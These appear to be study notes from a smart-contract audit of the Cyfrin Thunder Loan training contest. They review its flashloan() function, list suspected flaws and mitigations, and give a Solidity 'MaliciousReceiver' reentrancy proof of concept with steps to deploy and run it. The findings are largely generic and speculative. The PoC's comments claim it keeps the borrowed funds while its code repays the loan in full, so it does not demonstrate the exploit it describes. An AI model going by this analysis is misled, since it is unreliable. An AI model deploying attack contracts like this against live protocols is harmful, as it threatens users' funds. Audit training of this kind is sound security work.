# 1️⃣ Initial Review

## Scoping

You can read about the scope details [here](https://github.com/Cyfrin/2023-11-Thunder-Loan?tab=readme-ov-file#audit-scope-details).

* Commit Hash: e8ce05f5530ca965165d41547b289604f873fdf6
* In Scope:

```
├── interfaces
│   ├── IFlashLoanReceiver.sol
│   ├── IPoolFactory.sol
│   ├── ITSwapPool.sol
│   #── IThunderLoan.sol
├── protocol
│   ├── AssetToken.sol
│   ├── OracleUpgradeable.sol
│   #── ThunderLoan.sol
#── upgradedProtocol
    #── ThunderLoanUpgraded.sol
```

### Install Solidity Metrics in VsCode

```
Search for solidity metrics

Install it
```



## Reconnaissance

{% embed url="https://github.com/ZhangZhuoSJTU/Web3Bugs" %}

```
#Read the protocol docs

#Run test cases
forge test
```



## Code Review

```
# In VS code right click on the src folder and select Solidity:Metrics
```

### Tools to Run

* Slither
* Aderyn

### Reviewing the flashloan() function

The flashloan() function can be found in the source file /src/protocol/ThunderLoan.sol

<pre class="language-solidity"><code class="lang-solidity"> function flashloan(address receiverAddress, IERC20 token, uint256 amount, bytes calldata params) external {
        AssetToken assetToken = s_tokenToAssetToken[token];
        uint256 startingBalance = IERC20(token).balanceOf(address(assetToken));

        if (amount > startingBalance) {
            revert ThunderLoan__NotEnoughTokenBalance(startingBalance, amount);
        }

        if (!receiverAddress.isContract()) {
            revert ThunderLoan__CallerIsNotContract();
        }

        uint256 fee = getCalculatedFee(token, amount);
        // slither-disable-next-line reentrancy-vulnerabilities-2 reentrancy-vulnerabilities-3
        assetToken.updateExchangeRate(fee);

        emit FlashLoan(receiverAddress, token, amount, fee, params);

        s_currentlyFlashLoaning[token] = true;
        assetToken.transferUnderlyingTo(receiverAddress, amount);
        // slither-disable-next-line unused-return reentrancy-vulnerabilities-2
        receiverAddress.functionCall(
            abi.encodeWithSignature(
                "executeOperation(address,uint256,uint256,address,bytes)",
                address(token),
                amount,
                fee,
                msg.sender,
                params
            )
        );

        uint256 endingBalance = token.balanceOf(address(assetToken));
<strong>        if (endingBalance &#x3C; startingBalance + fee) {
</strong>                revert ThunderLoan__NotPaidBack(startingBalance + fee, endingBalance);
        }
        s_currentlyFlashLoaning[token] = false;
    }
</code></pre>

This `flashloan` function contains several security issues, particularly related to reentrancy and the potential for underpayment of the loan. Let's break them down:

#### 1. **Reentrancy Vulnerability**:

* **Problem**: The function calls `receiverAddress.functionCall()` before verifying that the loan has been paid back with the fee. If the `receiverAddress` contract is malicious or vulnerable, it could re-enter the `flashloan` function (via some other code path) and perform another action before the current execution is completed. This can lead to a situation where the state is manipulated in an unexpected way, potentially allowing the `receiverAddress` to escape paying back the full amount.
* **Mitigation**: To avoid reentrancy, you should update the contract’s state to reflect that the flash loan has been completed _before_ making any external calls. Moving the `s_currentlyFlashLoaning[token] = false;` statement to just after the loan execution or using a mutex-style lock to prevent reentrancy is advisable.

#### 2. **Lack of Checks After External Call**:

* **Problem**: After the external call to `receiverAddress.functionCall()`, the contract only checks the ending balance against the starting balance plus the fee. This check is performed _after_ transferring the loan amount and making the external call, which could potentially be manipulated in some cases, especially if other operations are taking place concurrently.
* **Mitigation**: You should ensure that the contract's state is securely updated before and after any external call. Rechecking balances after every state-changing operation can help mitigate some risks.

#### 3. **Slippage and Fee Manipulation**:

* **Problem**: The contract does not protect against slippage or manipulation of the fee by the `updateExchangeRate(fee)` function. If an attacker can manipulate the exchange rate or fee calculation, they could potentially pay back less than required.
* **Mitigation**: Ensure that the fee is calculated in a secure and predictable manner, ideally resistant to external manipulation. Consider implementing checks that prevent fee manipulation.

#### 4. **Denial of Service (DoS) via Flash Loan Execution**:

* **Problem**: If the `receiverAddress` contract is not properly coded or intentionally malfunctions (e.g., reverts during `functionCall`), it could prevent the flash loan from being successfully executed and returned, potentially locking funds in the contract.
* **Mitigation**: Implement fallback mechanisms or timeouts to handle such cases, ensuring that the contract does not get stuck in an unusable state.

#### 5. **Event Emission Before State Changes**:

* **Problem**: The event `FlashLoan` is emitted before the state change `s_currentlyFlashLoaning[token] = true;`. This could lead to discrepancies between the emitted event and the actual state of the contract if the transaction fails after the event is emitted but before the state change.
* **Mitigation**: Emit events _after_ making state changes to ensure that the event data reflects the true state of the contract.

#### 6. **Failure to Handle Edge Cases**:

* **Problem**: The function assumes that the `receiverAddress` contract will always return the funds along with the fee. However, if the `executeOperation` function fails, the contract does not seem to have a fallback mechanism to handle this scenario.
* **Mitigation**: Implement additional checks and conditions to handle cases where the `executeOperation` fails or reverts, possibly involving a revert with a more descriptive error message or taking alternative actions.

#### 7. **Potential for Reentrancy in `updateExchangeRate(fee)`**:

* **Problem**: If the `updateExchangeRate` function is vulnerable to reentrancy or relies on external inputs, it could be exploited by a malicious actor.
* **Mitigation**: Carefully review and secure the `updateExchangeRate` function to ensure it is not vulnerable to manipulation or reentrancy attacks.



## PoC

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./FlashLoanContract.sol"; // Assume this is the contract containing the vulnerable flashloan function
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract MaliciousReceiver {
    FlashLoanContract public flashLoanContract;
    IERC20 public token;
    address public owner;
    uint256 public reentrancyCounter;

    constructor(address _flashLoanContract, address _token) {
        flashLoanContract = FlashLoanContract(_flashLoanContract);
        token = IERC20(_token);
        owner = msg.sender;
    }

    // This function will be called by the flashloan contract
    function executeOperation(
        address, // tokenAddress
        uint256 amount,
        uint256 fee,
        address initiator,
        bytes calldata params
    ) external {
        require(msg.sender == address(flashLoanContract), "Not flashloan contract");

        // Re-enter the flashloan function before the first one completes
        if (reentrancyCounter == 0) {
            reentrancyCounter += 1;
            // Attempt to take out another flash loan within the first loan
            flashLoanContract.flashloan(address(this), token, amount, params);
        }

        // Repay the loan with the minimum required, but exploit the vulnerability to keep the funds
        uint256 totalRepayment = amount + fee;
        token.transfer(address(flashLoanContract), totalRepayment);

        // Optionally, you could revert here to cause a DoS attack on the contract
        // require(false, "Reentrancy attack!");
    }

    // Function to start the attack
    function startAttack(uint256 amount, bytes calldata params) external {
        require(msg.sender == owner, "Not owner");
        flashLoanContract.flashloan(address(this), token, amount, params);
    }

    // Fallback function to receive Ether (if needed)
    receive() external payable {}
}

```

## Steps to Execute

* **Deploy the `MaliciousReceiver` Contract**:
  * Deploy the `MaliciousReceiver` contract, passing the address of the vulnerable flash loan contract and the ERC20 token address as constructor parameters.
* **Call `startAttack`**:
  * Call the `startAttack` function on the `MaliciousReceiver` contract, specifying the amount of tokens to borrow and any necessary parameters.
* **Exploit the Reentrancy**:
  * During the execution of `executeOperation`, the `MaliciousReceiver` contract re-enters the `flashloan` function before the original loan is settled. This can lead to unexpected behavior, such as draining funds, executing multiple loans, or causing other state manipulation.
